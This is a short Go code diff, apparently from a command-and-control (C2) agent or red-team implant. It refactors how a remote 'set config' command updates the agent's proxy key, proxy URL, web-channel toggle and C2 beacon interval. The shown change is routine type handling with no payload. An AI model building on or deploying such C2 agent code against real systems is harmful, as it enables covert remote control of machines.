@@ -484,17 +484,17 @@ func (a *Agent) ProcessRecvQ(command AgentCommand, data_id string, padded_bytes_
 		break
 	case AgentCommand_AGENT_SET_CONFIG:
 		newConfig := commandRequest.Config
-		if newConfig.GetWebKey() != "" {
-			a.config.ProxyKey = newConfig.GetWebKey()
+		if newConfig.GetWebKey() != nil {
+			a.config.ProxyKey = newConfig.GetWebKey().Value
 		}
-		if newConfig.GetWebUrl() != "" {
-			a.config.ProxyUrl = newConfig.GetWebUrl()
+		if newConfig.GetWebUrl() != nil {
+			a.config.ProxyUrl = newConfig.GetWebUrl().Value
 		}
-		if newConfig.GetUseWebChannel() {
-			a.config.ProxyEnabled = newConfig.GetUseWebChannel()
+		if newConfig.GetUseWebChannel() != nil {
+			a.config.ProxyEnabled = newConfig.GetUseWebChannel().Value
 		}
-		if newConfig.GetC2IntervalMs() != 0 {
-			a.config.C2Interval = int(newConfig.GetC2IntervalMs())
+		if newConfig.GetC2IntervalMs() != nil {
+			a.config.C2Interval = int(newConfig.GetC2IntervalMs().Value)
 		}
 		log.Printf("updated config to: %s\n", commandRequest.GetConfig())
 
